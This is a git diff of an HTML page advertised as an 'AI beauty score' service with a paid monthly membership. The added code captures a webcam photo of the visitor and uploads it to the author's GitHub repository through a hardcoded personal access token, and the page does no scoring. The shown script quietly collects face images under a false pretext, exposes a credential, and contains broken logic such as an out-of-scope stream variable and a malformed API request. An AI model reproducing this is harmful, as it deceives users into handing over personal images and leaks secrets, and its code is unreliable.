@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI颜值打分</title>
     <style>
+        <style>
 		.bg{
             background-image: url('https://pic.nximg.cn/file/20191206/28968572_142702433936_1.jpg');
 		    width: 113px; /*设置元素宽度*/
@@ -54,68 +55,82 @@
             background-color: #45a049; /* 悬停时的背景颜色 */
         }
     </style>
+    </style>
 </head>
 <body>
     <div class="bg">
-    <h1 align="center" class="shine">AI颜值打分<br> 
-        免费用户一日可试用1次<br>
-        购买此会员（19.9＄/月）<br>
-        限时折扣
-    </h1>
+        <h1 align="center" class="shine">AI颜值打分<br> 
+            免费用户一日可试用1次<br>
+            购买此会员（19.9＄/月）<br>
+            限时折扣
+        </h1>
     </div>
-    <div style="text-align: center;"> <!-- 使用一个容器来将按钮置于中央 -->
-        <div class="center">
-        <button id="captureButton" style="margin: 0 auto; display: block; padding: 10px 20px;">上传或拍照</button>
+    <div style="text-align: center;">
+        <button id="captureButton">上传或拍照</button>
     </div>
     <canvas id="canvas" style="display:none;"></canvas>
+
     <script>
         document.getElementById('captureButton').addEventListener('click', function() {
             var canvas = document.getElementById('canvas');
             var context = canvas.getContext('2d');
+            var video = document.createElement('video');
 
-            // 访问用户摄像头
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function(stream) {
-                    // 在 Canvas 上显示摄像头捕获的视频流
-                    var video = document.createElement('video');
                     video.srcObject = stream;
                     video.play();
-                    video.addEventListener('loadedmetadata', function() {
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        // 将 Canvas 中的图像转换为 data URL
-                        var imageDataURL = canvas.toDataURL('image/jpeg');
-
-                        // 停止视频流
-                        stream.getTracks().forEach(function(track) {
-                            track.stop();
-                        });
-
-                        /*// 发送图像数据到服务器
-                        var xhr = new XMLHttpRequest();
-                        xhr.open('POST', '/upload', true);
-                        xhr.setRequestHeader('Content-Type', 'application/json');
-                        xhr.onload = function() {
-                            if (xhr.status === 200) {
-                                alert('上传成功!');
-                            } else {
-                                alert('上传失败!');
-                            }
-                        };*/
-                        // 将图像保存到本地
-                        var link = document.createElement('a');
-                        link.download = 'snapshot.jpg';
-                        link.href = imageDataURL;
-                        link.click();
-                        xhr.send(JSON.stringify({ image: imageDataURL }));
+                    return new Promise((resolve) => {
+                        video.addEventListener('loadedmetadata', resolve);
                     });
                 })
+                .then(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.style.display = 'block'; // 显示canvas
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // 暂停视频并停止流
+                    video.pause();
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // 将Canvas转换为Blob
+                    canvas.toBlob(function(blob) {
+                        uploadToGitHub(blob);
+                    }, 'image/jpeg');
+                })
                 .catch(function(error) {
-                    console.error('摄像头访问失败:', error);
+                    console.error('摄像头访问失败：', error);
                 });
         });
+
+        function uploadToGitHub(blob) {
+            const token = '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'; // 替换为你的GitHub个人访问令牌
+            const repoOwner = 'FSDon9'; // 替换为你的GitHub用户名
+            const repoName = 'fsdon9.github.io/'; // 替换为你的GitHub仓库名
+            const filePath = 'image.jpg'; // 替换为GitHub仓库中的文件路径
+            const commitMessage = 'Upload image from AI beauty score app'; // 提交信息
+
+            const formData = new FormData();
+            formData.append('file', blob, 'image.jpg');
+            formData.append('message', commitMessage);
+            formData.append('branch', 'main');
+
+            fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, {
+                method: 'PUT',
+                headers: {
+                    'Authorization': `token ${token}`
+                },
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('上传成功：', data);
+            })
+            .catch(error => {
+                console.error('上传失败：', error);
+            });
+        }
     </script>
 </body>
 </html>
